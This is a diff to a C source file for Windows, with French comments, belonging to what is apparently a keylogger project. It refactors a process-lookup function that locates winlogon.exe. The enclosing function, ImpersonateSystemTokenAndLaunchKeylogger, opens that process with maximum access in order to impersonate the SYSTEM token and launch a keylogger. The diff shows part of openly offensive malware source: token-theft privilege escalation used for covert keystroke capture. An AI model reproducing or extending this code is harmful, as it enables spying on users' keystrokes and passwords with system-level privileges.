@@ -116,7 +116,7 @@ void PrintPrivileges(HANDLE hToken)
 /**
  * Trouve l'identifiant de processus en fonction du nom de ce dernier.
  */
-DWORD GetPIDByProcName(void)
+DWORD GetPIDByProcName(char *name)
 {
     HANDLE handleProc = NULL;
     PROCESSENTRY32 pe32;
@@ -130,24 +130,24 @@ DWORD GetPIDByProcName(void)
         CloseHandle(handleProc);
         exit(PrintError());
     }
-    if (!strcmp(pe32.szExeFile, "winlogon.exe"))
+    if (!strcmp(pe32.szExeFile, name))
     {
-        printf("Found winlogon.exe with PID %lu\n", pe32.th32ProcessID);
+        printf("Found %s with PID %lu\n", name,  pe32.th32ProcessID);
         CloseHandle(handleProc);
         return  pe32.th32ProcessID;
     }
     while (Process32Next(handleProc, &pe32))
     {
-        if (!strcmp(pe32.szExeFile, "winlogon.exe"))
+        if (!strcmp(pe32.szExeFile, name))
         {
-            printf("Found winlogon.exe with PID %lu\n", pe32.th32ProcessID);
+            printf("Found %s with PID %lu\n", name, pe32.th32ProcessID);
             CloseHandle(handleProc);
             return pe32.th32ProcessID;
         }
     }
     CloseHandle(handleProc);
-    log("Impossible to find winlogon.exe's PID. WHAT THE FU ??\n");
-    exit(ERROR);
+    log("Impossible to find the wanted process PID.\n");
+    return 1;
 }
 
 /**
@@ -181,6 +181,9 @@ VOID ImpersonateSystemTokenAndLaunchKeylogger(LPPROCESS_INFORMATION keylogInfo, 
     HANDLE procHandle = NULL;
     HANDLE newSysTok = NULL;
     HANDLE currentToken = NULL;
+    char *winlogon = "winlogon.exe";
+    DWORD winlogonPID = 1;
+
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentToken))
     {
         log("OpenProcessToken failed.\n");
@@ -192,7 +195,9 @@ VOID ImpersonateSystemTokenAndLaunchKeylogger(LPPROCESS_INFORMATION keylogInfo, 
     // PrintUserNameByProc();
 
     // PrintPrivileges(GetCurrentProcessToken());
-    procHandle = OpenProcess(MAXIMUM_ALLOWED, TRUE, GetPIDByProcName());
+    winlogonPID = GetPIDByProcName(winlogon);
+    if (winlogonPID == 1) exit(ERROR);//1 can not be a PID on windows
+    procHandle = OpenProcess(MAXIMUM_ALLOWED, TRUE, winlogonPID);
     if (procHandle == NULL)
     {
         log("Impossible to get the process handle.\n");
